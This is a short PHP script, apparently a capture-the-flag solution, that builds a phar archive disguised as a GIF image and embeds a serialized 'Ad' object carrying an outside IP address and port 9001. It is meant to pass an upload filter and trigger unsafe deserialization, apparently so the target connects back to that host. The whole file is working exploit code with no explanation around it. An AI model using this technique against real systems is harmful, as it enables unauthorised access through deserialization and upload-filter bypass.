<?php
class Ad {
    function __construct($ip, $port) {
        $this->ip = $ip;
        $this->port = $port;
    }
}

@unlink("2.phar");
$ip = '106.52.172.228';
$port = '9001';
$phar = new Phar("2.phar");
$phar->startBuffering();
$phar->setStub("GIF89a" . "<script language='php'>__HALT_COMPILER();</script>");
$o = new Ad($ip, $port);
$phar->setMetadata($o);
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
rename("2.phar", "2.gif");
